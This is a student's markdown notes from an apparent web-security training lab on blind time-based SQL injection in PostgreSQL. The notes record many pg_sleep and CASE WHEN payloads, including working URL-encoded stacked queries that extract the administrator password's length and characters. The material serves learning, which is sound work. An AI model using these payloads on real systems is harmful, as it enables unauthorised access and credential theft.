# The Lab
# Goal: Log in as Admin

# Preliminary Work
- Given: no different responses for errors or no rows or custom welcome messages returned
    - thus, conditional error payloads are not applicable
- Do conditional payloads with time delays

# Conditional Time Delay Exploitation
- Testing version of SQL with unconditional time delays
    - PostgreSQL: fake'||pg_sleep(10)-- (:white_check_mark:)
- Testing conditional time delays
    - PostgreSQL: fake'||SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--
        - Loads normally? (:white_check_mark:)
    - Delays?
        - fake'||SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END-- (:x:)
        - fake'||SELECT+CASE+WHEN+(1=1)+THEN+ pg_sleep(10)+ELSE+pg_sleep(0)+END-- (:x:)
        - fake'||SELECT+CASE+WHEN+(1=1)+THEN+ pg_sleep(10)+ELSE+pg_sleep(0)+END# (:x:)
        - fake'+SELECT+CASE+WHEN+(1=1)+THEN+ pg_sleep(10)+ELSE+pg_sleep(0)+END-- (:x:)
        - fake'+SELECT+CASE+WHEN+(1=1)+THEN+ pg_sleep(10)+ELSE+pg_sleep(0)+END# (:x:)
        - fake';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END-- (:x:)
        - fake';SELECT+CASE+WHEN+(1=1)+THEN+ pg_sleep(10)+ELSE+pg_sleep(0)+END-- (:x:)
        - fake';SELECT+CASE+WHEN+(1=1)+THEN+ pg_sleep(10)+ELSE+pg_sleep(0)+END# (:x:)
        - fake';SELECT+CASE+WHEN+(1=1)+THEN+ pg_sleep(10)+ELSE+pg_sleep(0)+END-- (:x:)
        - fake';SELECT+CASE+WHEN+(1=1)+THEN+ pg_sleep(10)+ELSE+pg_sleep(0)+END# (:x:)
        - Looked at solution
            - Completely forgot about URL encoding lol
                - Imagine people actually santizing input lol
            - fake'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END-- (:white_check_mark:)
                - %3B = semicolon
                - Had good idea with plus signs
- Using conditional time delays to extract password characters

# Extracting Information
- Trying: fake'%3BIF+(SELECT+COUNT(username)+FROM+users+WHERE+username+=+'administrator'+AND+SUBSTRING(password,1,1)+>+'m')+=+1+THEN+pg_sleep(10)+ELSE+pg_sleep(0)-- (:x:)
    - Testing to see if the expression is true? (evaluates to 1) <-- PLEASE INVESTIGATE
    - Reminders:
        - Indexing begins from 1
        - First # is index
        - Second # is number of characters after first index to include
- Subsequent Attempts:
    - Replacing %3B with ||
    - Removing plus signs
    - Did not try changing comment characters cuz fake'||pg_sleep(10)-- works
- Looked at solution -> need to change syntax drastically lol
    - Put 'FROM users' at end of statement before comments
    - Replace 'SELECT COUNT' with 'SELECT CASE WHEN'
    - They use 'LENGTH(password)' to get length before spamming with guesses
        - Better strat than mine lol
    - Put 'END' when done with if statement
    - Removed '= 1' at end of if statment condition
    - Removed IF statement entirely
        - Using SELECT CASE WHEN
- Reformulating...
- New payload attempt: fake'%3BSELECT+CASE+WHEN+(username+=+'administrator'+AND+LENGTH(password)+>+1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- (:white_check_mark)
    - IT WORKS!!! -> need to continue testing for length
    - Greater than 10
    - Less than or equal to 20
    - Greater than 15
    - Greater than 17
    - Either 18, 19, or 20
        - Not 18
        - Not 19
        - Yes 20! (:white_check_mark)
            - Payload: fake'%3BSELECT+CASE+WHEN+(username+=+'administrator'+AND+LENGTH(password)+=+20)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
            - Only 1 equal sign (not usual ==)
    - Password is 20 (will need to use a LOT of payloads since I am doing it manually)
- Payload for letter equality: fake'%3BSELECT+CASE+WHEN+(username+=+'administrator'+AND+SUBSTRING(password,1,1)+>+'m')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
    - Having ASCII Chart is nice ![ASCII Chart](./ASCII_Chart.jpg)
    - Letter 1: v
        - Greater than 'm' (:white_check_mark:)
            - Greater than 'M'
            - Greater than 'G'
            - Greater than 'D'
            - Either 'A','B','C'
                - Not 'A'
                - Not 'B'
                - Not 'C'
            - Thus, not a letter
            - Try numbers next
                - Greater than '5'
                - Greater than '2'
                - Not '1'
            - Try other symbols before numbers and after whitespace characters
                - Greater than ')'
                - Greater than '$'
                - Greater than '"'
                - Not !
            - IDK WHAT IS HAPPENING LOL
                - At least some delays are happening though :)
            - I said "greater than 'm'" then did values less then 'm' LMAO
        - Greater than or equal to 'v' (:white_check_mark:)
        - Greater than 'v' (:x:)
        - Equal to 'v' (:white_check_mark:)
    - Letter 2: l (lowercase ele)
        - Greater than 'm' (:x:)
        - Greater than 'M' (:x:)
        - Greater than 'K' (:x:)
        - Greater than 'D' (:x:)
        - Greater than 'A' (:x:)
        - Greater than '0' (:white_check_mark:)
            - The number Zero
        - Greater than '9' (:white_check_mark:)
            - Thus, not a number
        - Equal to ':', '<', '>', '=', '?', '@' (:x:)
            - Based on data, it should be ';', but I need escape character for it to not break the string lol
            - Trying to use a roundabout way
        - Tried URL encoding %3B but no work :(
        - Greater than ':' (:white_check_mark:)
        - Less than '<' (:x:)
        - NVM lol, just doing greater that stuff again
        - Greater than ':' (:white_check_mark:)
        - Greater than '<' (:white_check_mark:)
        - Greater than '=' (:white_check_mark:)
        - Greater than '?' (:white_check_mark:)
        - Equal to 'A' (:x:)
        - Greater than '@' (:white_check_mark:)
        - Greater than '@' and Less than 'A'

        - IDK LMAO
        - trying again

        - Greater than 'm' (:x:)
        - Less than 'm' (:white_check_mark:)
        - Less than 'M' (:white_check_mark:)
        - Less than 'D' (:x:)
        - Greater than 'D' (:white_check_mark:)
        - Greater than 'I' (:white_check_mark:)
        - Greater than 'K' (:white_check_mark:)
        - Equal to 'L' (:x:)
        - Greater than 'M' (:x:)
        - Less than or Equal to 'L' (:white_check_mark:)
        - Greater than or Equal to 'L' (:x:)
        - Did the <= and >= stuff with 'I', 'J', 'K', 'M'
        - For some reason, I thought of trying 'l' (lowercase L) AND IT WORKED (:white_check_mark:) (:white_check_mark:) (:white_check_mark:) (:white_check_mark:)
        - Thus, I do not need to do the checks for uppercase or lowercase
        - Once I deduce which letter it MUST be, use = to determine uppercase or lowercase
            - Will test this method with next letter to ensure correctness

        - TRY TO LOOK UP HOW CHAR INEQUALITIES WORK IN POSTGRESQL  
    - Letter 3: j
        - Greater than 'm' (:x:)
        - Greater than 'a' (:white_check_mark:)
        - Greater than 'd' (:white_check_mark:)
        - Greater than 'j' (:x:)

        - Thus, either e / f / g / h / i

        - Greater than 'e' (:white_check_mark:)
        - Greater than 'f' (:white_check_mark:)
        - Greater than 'g' (:white_check_mark:)
        - Greater than 'h' (:white_check_mark:)

        - Thus, either 'i' or 'I'
        - Equal to 'i' (:x:)
        - Equal to 'I' (:x:)

        - Forgot that 'j' is not greater than 'j' too
        - Equal to 'j' (:white_check_mark:)

        


# Observations
- '||' concantenation works for unconditional time delays ONLY
- Might try the URL encoded semicolon on previous labs that I could not solve
- Stop trying to copy paste syntax from lessons
    - Figure out what you want to do and look up proper SQL syntax
    - Still learn strats from lessons, but apply syntax from own research
    - SQL cheat sheet might not be as helpful as it sounds
- Getting 504 Response = Timeout -> try opening new lab

